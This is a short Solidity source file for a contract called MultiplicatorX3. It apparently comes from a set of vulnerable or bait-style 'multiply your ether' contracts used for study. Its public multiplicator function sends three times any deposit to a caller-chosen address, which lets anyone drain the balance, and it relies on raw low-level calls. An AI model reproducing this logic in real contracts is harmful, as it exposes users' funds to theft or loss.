pragma solidity ^0.4.18;

contract MultiplicatorX3 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _target, bytes _data) public payable {
        require(msg.sender == owner);
        require(_target.call.value(msg.value)(_data));
    }

    function multiplicator(address _target) public payable {
        require(msg.value > 0);
        if (_target.call.value(msg.value * 3)()) {
            return;
        }
        revert();
    }
}